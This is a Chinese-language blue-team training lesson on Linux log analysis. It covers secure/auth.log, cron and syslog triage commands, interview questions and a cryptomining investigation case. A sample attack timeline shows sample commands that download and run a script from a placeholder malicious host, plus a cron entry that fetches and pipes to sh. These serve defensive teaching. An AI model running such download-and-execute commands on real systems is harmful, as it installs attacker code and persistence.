---
day: 10
title: 系统日志综合分析
phase: 第一阶段
difficulty: ⭐⭐ 基础
---

# Day 10：系统日志综合分析

> **阶段**：第一阶段 · 蓝队极速上岗 | **难度**：⭐⭐ 基础 | **课时**：2-3小时

---

## 📋 今日学习目标

1. 掌握Linux系统核心日志文件的位置和作用
2. 能分析secure日志中的登录行为，识别异常登录
3. 会查看cron日志，发现攻击者添加的定时任务
4. 学会从messages/syslog中排查系统异常
5. 能够独立完成一份模拟攻击场景的日志排查

---

## 📖 核心知识讲解

### 一、Linux日志都在哪？

Linux系统把所有运行日志存在 `/var/log/` 目录下：

```
/var/log/
├── secure           ← ⭐ 安全认证日志（最最重要！）
├── messages         ← 系统通用日志（CentOS/RHEL）
├── syslog           ← 系统通用日志（Ubuntu/Debian/Kali）
├── auth.log         ← 认证授权日志（Ubuntu/Debian）
├── cron             ← 计划任务日志
├── boot.log         ← 系统启动日志
├── dmesg            ← 内核消息缓冲区日志
├── nginx/           ← Nginx日志目录
│   ├── access.log   ← Web访问日志
│   └── error.log    ← Web错误日志
├── mysql/           ← MySQL数据库日志
│   └── error.log
└── audit/           ← Linux审计日志（高级）
```

> 🔑 **蓝队日志排查优先级**：secure > messages/syslog > cron > Web日志 > 其他

### 二、secure日志 —— 蓝队的安全"心电图"

`secure`（或`auth.log`）记录了所有与用户认证相关的事件，是蓝队排查入侵的第一站。

**一条典型的secure日志：**

```
Jun 10 14:35:22 server1 sshd[12345]: Failed password for root from 10.0.0.55 port 22 ssh2
│              │                │                            │
时间           主机名          进程                         事件详情：谁从哪登录失败了
```

**secure日志中的关键事件识别：**

| 日志关键词 | 含义 | 蓝队判断 |
|:---|:---|:---|
| `Accepted password for 用户 from IP` | 密码登录成功 | 记录：谁在什么时候从哪个IP登录了 |
| `Failed password for 用户 from IP` | 密码登录失败 | ⚠️ 暴力破解痕迹 |
| `Accepted publickey for 用户 from IP` | 密钥登录成功 | 记录（但攻击者可能偷了密钥） |
| `Invalid user 用户名 from IP` | 登录用了不存在的用户名 | ⚠️ 可能在探测用户 |
| `session opened for user` | 用户登录后的会话建立 | 确认登录成功的时间 |
| `session closed for user` | 用户退出登录 | 确认活动时长 |
| `pam_unix(sudo:auth)` | sudo认证（想用管理员权限） | ⚠️ 普通用户想提权 |
| `authentication failure` | 认证失败（各种原因） | 汇总标志 |
| `Connection closed by` | 连接被关闭 | 可能是自己被踢或者被发现了 |

### 三、实战：如何在secure日志中找攻击迹象

#### 步骤1：查看最近的所有登录失败

```bash
# 查看所有失败的密码尝试
sudo grep "Failed password" /var/log/secure

# 或 Ubuntu/Kali：
sudo grep "Failed password" /var/log/auth.log
```

#### 步骤2：统计哪些IP在暴破

```bash
# 统计失败登录的来源IP排名
sudo grep "Failed password" /var/log/secure | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head

# 解释：$(NF-3) 取倒数第3个字段（IP所在位置可能因格式而异，需要先看一条日志确认）
```

#### 步骤3：查看成功登录记录

```bash
# 查看所有成功的密码登录
sudo grep "Accepted password" /var/log/secure

# 关注：有没有异常时间（凌晨2-5点）、异常IP（非公司网段）、异常用户（root远程登录）的登录成功
```

#### 步骤4：查看用户创建和删除

```bash
# 查看新用户创建
sudo grep "new user" /var/log/secure

# 查看用户删除
sudo grep "delete user" /var/log/secure
# 或
sudo grep "userdel" /var/log/secure
```

### 四、cron日志 —— 侦查攻击者的定时后门

很多攻击者会在系统中添加定时任务，定时执行恶意程序（如反弹shell、挖矿程序）。

```bash
# 查看cron执行记录
sudo cat /var/log/cron | tail -50

# 查找最近的非root定时任务执行
sudo grep -v "root" /var/log/cron | tail -50

# 看看有哪些定时任务
crontab -l          # 当前用户的
sudo crontab -l     # root的
ls /etc/cron.*      # 系统级定时任务
```

**可疑特征：**
- CMD字段包含奇怪的路径（如 `/tmp/.hidden/update`）
- 定时任务每1分钟执行一次（太频繁）
- 执行的内容是反弹shell命令

### 五、messages/syslog —— 系统全局日志

这里记录了系统的各种事件，蓝队主要关注：

```bash
# 查看最近的服务启动/停止
sudo grep "Started\|Stopped" /var/log/messages | tail -20

# 查看是否有内核异常（可能被利用的漏洞）
sudo grep -i "error\|fail\|segfault" /var/log/messages | tail -20

# 查看网络相关事件
sudo grep -i "network\|eth\|link" /var/log/messages | tail -20
```

### 六、综合排查实战场景

**模拟场景：** 你是某公司安全运营人员，接到通知"服务器可能被入侵了"。请按以下步骤排查：

```bash
# ======== 排查脚本（可直接复制到终端执行）========

echo "===== 1. 最近3天的成功登录 ====="
sudo grep "Accepted" /var/log/auth.log | tail -20

echo ""
echo "===== 2. 最近3天的失败登录 ====="
sudo grep "Failed password" /var/log/auth.log | tail -20

echo ""
echo "===== 3. 失败登录TOP10来源IP ====="
sudo grep "Failed password" /var/log/auth.log | awk '{for(i=1;i<=NF;i++) if($i ~ /[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/) print $i}' | sort | uniq -c | sort -rn | head -10

echo ""
echo "===== 4. 最近新增的用户 ====="
sudo grep "new user" /var/log/auth.log | tail -10

echo ""
echo "===== 5. 当前监听的非标准端口 ====="
ss -tlnp | grep -v "127.0.0.1" | grep -vE "(:22|:80|:443) "

echo ""
echo "===== 6. 最近修改的计划任务 ====="
sudo grep "CMD" /var/log/cron | tail -20

echo ""
echo "===== 7. 最近1小时修改的文件（关键目录）====="
sudo find /etc /tmp /var/tmp -type f -mmin -60 2>/dev/null

echo ""
echo "===== 8. 当前在线用户 ====="
w
```

### 七、判断是否被入侵的关键指标

| 指标 | 正常 | 可疑 | 确认入侵 |
|:---|:---|:---|:---|
| 登录时间 | 工作时间 | 深夜/凌晨 | 深夜+陌生IP |
| 登录IP | 公司/家庭IP段 | 境外或未知IP | 境外IP+登录成功 |
| 登录用户 | 已知用户 | root直接远程登录 | 突然冒出的新管理员 |
| 进程列表 | 已知服务 | 陌生进程名 | 进程藏在/tmp下 |
| 计划任务 | 系统维护 | 不认识的CMD | 反弹shell命令 |
| 网络连接 | 已知服务端口 | 非标准端口 | 外连境外IP |

---

## 🔧 实操任务

### 任务1：查看你自己的系统日志（15分钟）

```bash
# 1. 查看你虚拟机的登录日志
sudo tail -50 /var/log/auth.log    # Ubuntu/Kali
# 或
sudo tail -50 /var/log/secure      # CentOS

# 2. 找找有没有失败登录
sudo grep "Failed password" /var/log/auth.log

# 3. 找找成功登录记录
sudo grep "Accepted" /var/log/auth.log

# 4. 看看cron的运行记录
sudo tail -30 /var/log/cron 2>/dev/null || sudo tail -30 /var/log/syslog | grep CRON
```

### 任务2：创建模拟攻击场景并排查（25分钟）

```bash
# 在Kali虚拟机中模拟：
# 1. 故意输错几次SSH密码
ssh localhost  # 输入错误密码3次

# 2. 然后查看日志中的失败记录
sudo grep "Failed password" /var/log/auth.log | tail -10

# 3. 添加一个测试用的定时任务
echo "* * * * * echo test > /tmp/test.txt" | crontab -

# 4. 查看cron日志确认定时任务被执行
sudo grep "test" /var/log/syslog
```

### 任务3：编写你的日志排查清单（20分钟）

根据今天学的内容，在你的笔记中整理一份《系统日志排查SOP（标准操作流程）》，至少包含：
1. 接到"系统异常"通知后，先查哪个日志？
2. 如何判断是否发生了暴力破解？
3. 如何发现攻击者添加的后门账号？
4. 如何发现可疑计划任务？

---

## ✅ 验收标准

- [ ] 能找到并打开 `/var/log/secure`（或`auth.log`）
- [ ] 能从secure日志中区分"成功登录"和"失败登录"
- [ ] 能统计暴力破解的来源IP
- [ ] 能查看cron日志并识别可疑计划任务
- [ ] 能完成5项以上系统排查命令操作
- [ ] 有自己的《系统日志排查SOP》笔记

---

## 📝 今日小结

系统日志是服务器被入侵后留下的"脚印"。攻击者可以删文件、杀进程，但要想彻底清除日志记录却很难。secure日志是蓝队最亲密的战友——每次登录、每次提权、每次异常，它都记得清清楚楚。

**记住今天的核心**：
- `/var/log/secure` = 安全认证日志，第一排查目标
- `Failed password` 密集出现 + 非工作时间 + 境外IP = 暴破
- `Accepted password` + 深夜 + 陌生IP = 高危
- `new user` = 可能的后门账号
- 定时任务放反弹shell = 经典持久化手法

---

## 📚 延伸阅读（可选）

- 了解 `fail2ban` —— 能自动封禁暴力破解IP的防护工具
- 搜索"Linux log analysis cheat sheet"获取更全面的日志分析速查表

---

## 🎯 蓝队面试高频题（Day 10 主题）

**Q1：Linux系统日志中，如何判断一次SSH登录是正常登录还是攻击登录？**

> 判断维度：
> 1. **时间**：凌晨2-5点的SSH登录高度可疑（正常运维不会这个时间登录）
> 2. **来源IP**：内网IP（运维人员）vs 外网IP（特别是境外IP）→外网IP可疑
> 3. **用户名**：root直接登录 vs 普通用户sudo → root直接登录不符合安全基线
> 4. **频率**：同一IP短时间内尝试多个用户名→暴力破解
> 5. **登录后行为**：登录后立刻执行了哪些命令（历史命令 + audit日志）
> 
> 排查命令：
> ```bash
> # 查看所有成功登录
> grep "Accepted" /var/log/secure
> # 查看所有失败登录
> grep "Failed" /var/log/secure
> # 统计每个IP的失败尝试次数
> grep "Failed password" /var/log/secure | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
> ```

**Q2：Windows Event ID 4624（登录成功）中的Logon Type字段代表什么？**

> | Logon Type | 含义 | 典型场景 |
> |:---|:---|:---|
> | 2 | 交互式登录 | 用户坐在电脑前输入密码 |
> | 3 | 网络登录 | 访问共享文件夹/SMB |
> | 4 | 计划任务 | 脚本/服务触发的登录 |
> | 5 | 服务登录 | Windows服务启动 |
> | 7 | 解锁 | 锁屏后解锁 |
> | 10 | 远程桌面(RDP) | 远程桌面登录 |
> | 11 | 缓存登录 | 离线时的域登录 |
> 
> **蓝队关注**：Type 10（RDP）出现在非办公时间段且来自陌生IP→高度可疑。Type 3（网络登录）失败次数异常→可能在枚举共享资源。

**Q3：如何综合使用多源日志还原攻击全貌？**

> 案例：某服务器被发现中挖矿病毒
> ```
> Step 1: secure.log → 发现root用户在外网IP X.X.X.X凌晨3点SSH登录成功
> Step 2: /var/log/btmp（失败登录日志）→ 发现该IP在过去1小时内尝试了5000次
> Step 3: history → root用户的历史命令中有 wget 恶意脚本 + chmod +x
> Step 4: crontab → 发现新增定时任务，每10分钟下载执行一次
> Step 5: ps aux → 发现高CPU进程（挖矿进程），进程名伪装成 [kworker]
> Step 6: Netstat → 发现挖矿进程与矿池IP建立连接
> ```
> 每个日志源提供一块拼图，拼在一起就是完整攻击链。这就是"关联分析"的核心含义。

---

## 📖 深度阅读：日志时间线——还原攻击的全过程

高级蓝队分析攻击时，最常用的方法是**构建时间线**——把多源日志按时间排序，还原攻击的每一步：

```
02:47:15 [secure]    Failed password for root from X.X.X.X  ← 暴力破解开始
02:47:16 [secure]    Failed password for root from X.X.X.X
... (重复5000次)
03:12:03 [secure]    Accepted password for root from X.X.X.X  ← 破解成功！
03:12:05 [secure]    session opened for user root
03:12:08 [bash_history] cd /tmp
03:12:10 [bash_history] wget http://malicious.com/payload.sh
03:12:15 [bash_history] chmod +x payload.sh
03:12:16 [bash_history] ./payload.sh
03:12:20 [ps]         suspicious_process started
03:12:25 [netstat]    connection to mining-pool.com:4444
03:13:00 [crontab]    */10 * * * * wget ... | sh  ← 持久化
```

**构建时间线的实操方法：**

```bash
# 1. 提取secure日志的时间+关键信息
grep "X.X.X.X" /var/log/secure | awk '{print $1,$2,$3, $5,$6,$7,$8}'

# 2. 提取bash_history中的命令（注意：history不带时间戳，需要配置）
cat ~/.bash_history

# 3. 按时间合并所有日志源
# 可以把每条记录按格式 时间 [来源] 事件 输出到同一个文件
```

> **核心感悟**：单条日志看是"点"，多条日志按时间串起来是"线"，多源日志交叉验证是"面"。蓝队能力成长就是从"看点" → "看线" → "看面"的过程。

---

## 🏋️ 额外实操挑战

1. **安全日志探索**：在Linux中用 `sudo cat /var/log/secure`（或 `auth.log`）查看认证日志，找出最近一次登录成功或失败的记录
2. **Windows事件演练**：在Windows中故意输错3次密码→打开事件查看器→找到对应的4625事件→查看详细信息
3. **多源关联练习**：在你的Linux虚拟机中：SSH登录→执行几个命令→退出→然后同时查看secure.log和bash_history，理解时间对应关系
4. **时间线构建**：选一个操作（比如安装一个软件），记录secure.log / yum.log / bash_history中的相关变化，构建一条完整的时间线

---

## ⚠️ 新手常见误区纠正

1. **误区**："系统日志太多太杂，不如只看安全设备日志"
   - **补充**：安全设备（IDS/WAF）的告警告诉你"可能发生了什么"，系统日志告诉你"实际发生了什么"。设备可能漏报（攻击绕过了WAF），但系统日志不会撒谎——攻击者进了服务器一定会留下痕迹。**安全设备是警报器，系统日志是监控录像。**

2. **误区**："只要日志里没报错就没问题"
   - **真相**：高明的攻击者会清理日志——删除/修改secure.log和bash_history。所以蓝队还要检查日志是否完整、是否有时间断层（某段时间日志为空→可疑）、是否有被修改的痕迹。

3. **误区**："日志分析需要把所有日志都看完"
   - **真相**：你只需要看"和正常基线偏离"的部分。先建基线（正常工作日每小时多少连接、多少登录），超过基线的才是需要关注的。就像你不会看完一整天的监控录像——先看有动静的时间段。

---

## 📖 深度补充内容

### 面试高频题与真实案例

## 💡 面试高频题：系统日志综合分析

**Q: Linux系统中哪些日志文件与安全最相关？**
A: ①/var/log/secure（认证日志，SSH登录/切换用户/sudo操作）；②/var/log/auth.log（Debian系同secure）；③/var/log/cron（计划任务日志，排查后门定时任务）；④/var/log/messages或syslog（系统综合日志）；⑤/var/log/audit/audit.log（审计日志，需安装auditd）；⑥~/.bash_history（用户命令历史，攻击者常删除此文件因此需要auditd补充）。

**Q: 如何从secure日志中识别SSH暴力破解？**
A: 特征：短时间内大量"Failed password for 用户 from IP"记录。统计命令：`grep "Failed password" /var/log/secure | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn`——看哪些IP尝试了大量错误密码。如果同一IP尝试了多个用户名，说明是字典攻击。

**Q: 攻击者成功SSH登录后通常做什么？你从哪些日志能看到？**
A: ①~/.bash_history：查看执行了哪些命令（下载工具、扫描内网、建立持久化）；②/var/log/secure：查看是否有sudo提权、su切换用户的操作；③/var/log/cron：查看是否创建了计划任务后门；④/var/log/yum.log或apt history：查看安装了哪些工具。

**Q: 如何建立日常的系统日志基线？**
A: ①正常登录：记录日常哪些IP、哪些用户、在什么时间段登录，登录频率是多少；②正常cron：记录系统中有哪些计划任务，执行频率和脚本内容；③正常进程：记录正常运行的服务和进程列表。有了基线后，任何新增的登录IP、新增的cron任务、新增的后台进程都能被快速定位为异常。


## 📊 真实案例：通过系统日志发现挖矿病毒

某蓝队成员在例行巡检时发现一台Web服务器的CPU使用率持续在95%以上，但业务访问量并没有显著增加。他进行了以下排查：

**排查步骤**：
1. `top` → 发现一个名为"[kworker]"的进程占用了400% CPU（该服务器是4核）
2. `ps aux | grep kworker` → 发现该进程的执行路径是/tmp/.cache/kworker，而正常kworker是内核线程，不应该有可执行文件
3. `ls -la /tmp/.cache/` → 发现隐藏目录中有kworker二进制文件和一个config.json配置文件
4. 查看config.json → 发现其中包含了矿池地址和钱包地址
5. 追溯入侵入口：`grep "Accepted" /var/log/secure | tail -20` → 发现3天前有一个来自境外IP的SSH登录成功记录，使用的账户是test/test123
6. 检查该test账户：`cat /etc/passwd | grep test` → 发现test账户是2周前创建的弱口令账户

**结论**：攻击者通过弱口令SSH登录→上传挖矿程序到/tmp/.cache/→配置计划任务维持运行→占用服务器资源挖矿。处置：删除test账户、清除挖矿程序、封禁攻击IP、全量修改服务器密码、推送整个集群排查同类问题。


---

## 🔬 深度专题：系统日志关联分析——构建攻击全景图

### 多日志源关联分析实战

单一日志只能看一个角度。真正的分析需要把Web日志、系统日志、安全设备日志串联起来：

**场景：还原一次完整的Web入侵**

**Step 1：从WAF日志发现入口**
```bash
grep "SQL Injection" /var/log/waf/alert.log | tail -5
# 输出：2026-06-18 10:05:23 SQL Injection from 45.xx.xx.xx to /api/query.php
```

**Step 2：到Web日志查看攻击全貌**
```bash
grep "45.xx.xx.xx" /var/log/nginx/access.log | tail -20
# 发现攻击者从10:05到10:15发出了各种SQL注入payload
# 10:12有一条返回200且响应体达50KB的请求 → 可能成功拖库
```

**Step 3：查系统日志看攻击者是否已获得服务器权限**
```bash
grep "45.xx.xx.xx" /var/log/secure
# 发现10:18有一条：Accepted password for www-data from 45.xx.xx.xx
# → 攻击者已经通过SQL注入写入webshell并获得了服务器权限！
```

**Step 4：查进程日志看攻击者做了什么**
```bash
# 检查bash_history（攻击者可能已删除，改用auditd）
ausearch -ts 06/18/2026 "10:15:00" -te 06/18/2026 "10:30:00" | grep "45.xx.xx.xx"
# 发现攻击者下载了内网扫描工具、尝试连接数据库
```

**结论**：这就是日志关联分析的威力——WAF日志→Web日志→系统日志→进程日志，逐层深入，最终还原完整攻击链。

### 自动化日志关联脚本

手动逐个查日志太慢，蓝队需要自动化关联脚本：

```bash
#!/bin/bash
# auto_trace.sh - 根据IP自动追溯攻击链
TARGET_IP=$1
echo "=== 攻击链追溯: $TARGET_IP ==="
echo ""
echo "--- WAF告警 ---"
grep "$TARGET_IP" /var/log/waf/alert.log 2>/dev/null | tail -10
echo ""
echo "--- Web访问日志 ---"
grep "$TARGET_IP" /var/log/nginx/access.log 2>/dev/null | tail -20
echo ""
echo "--- SSH登录尝试 ---"
grep "$TARGET_IP" /var/log/secure 2>/dev/null | tail -10
echo ""
echo "--- 防火墙日志 ---"
grep "$TARGET_IP" /var/log/firewall.log 2>/dev/null | tail -10
echo ""
echo "--- 进程审计（最近1小时）---"
ausearch -k process_tracking --start recent 2>/dev/null | grep -A2 "$TARGET_IP" | head -30
```

将此类脚本保存为工具集，护网期间通过一条命令快速追溯任意攻击IP的完整行为。


---

## 🎯 实战思维训练

### 蓝队"条件反射"训练

网络安全值守中，很多判断需要在几秒内完成。以下是本日主题相关的"条件反射"训练：

**看到以下现象 → 立即联想到 → 采取动作**：

1. 短时间内同一IP大量不同URL请求 → 目录/漏洞扫描 → 检查是否返回了不该返回的内容
2. WAF告警+同IP的Web日志中有500错误 → 攻击可能在尝试绕过WAF → 查看完整请求体
3. 非工作时间的管理员登录 → 凭据泄露/后门 → 确认是否为合法运维操作
4. 同一文件被频繁POST请求 → Webshell心跳 → 检查文件内容和创建时间
5. 出站流量突增到非标准端口 → 数据渗出/C2通信 → 追踪目标IP并阻断

### "如果是你，你怎么防？"

假设你是护网蓝队负责人，面对今天学习的安全威胁，请设计你的防御方案：
- 预防层：如何在攻击发生前阻止？（安全配置/代码审计/权限控制）
- 检测层：攻击发生时如何发现？（日志/告警/流量分析的关键特征）
- 响应层：确认攻击后如何处置？（隔离/封禁/取证/恢复的标准动作）
- 复盘层：事后如何防止再次发生？（规则优化/流程改进/培训加固）

---

## 📈 学习效果自检

请回答以下问题，不看笔记：

1. 能不能用3句话向一个非安全同事解释今天学的核心概念？
2. 能不能在白板上画出今天涉及的关键流程/架构？
3. 能不能写出至少3条针对今天主题的检测规则/命令？
4. 如果面试官问"你遇到过XX问题吗？怎么处理的？"你能给出有细节的回答吗？
5. 今天的实操任务中，有没有遇到卡住的地方？记录到笔记中，明天优先解决。

> **记不住？** 正常的。安全知识不是"看一遍就记住"的——是需要"反复遇到、反复使用、反复验证"之后才内化的。重要的是**坚持每天动手**，让大脑建立"安全思维"的神经通路。

---

## 🔗 知识链接

将今天的内容与之前学过的知识建立连接：
- 今天的知识点在Kill Chain的哪个阶段？在ATT&CK中对应哪些技术？
- 今天的检测方法依赖之前学过的哪些工具？（Wireshark/grep/awk/Nmap...）
- 如果用今天学的知识去看Day 1的护网场景，你能额外发现什么问题？

建立知识之间的链接是"从入门到精通"的关键——孤立的知识点容易遗忘，相互连接的知识形成网络后就会变得牢固。
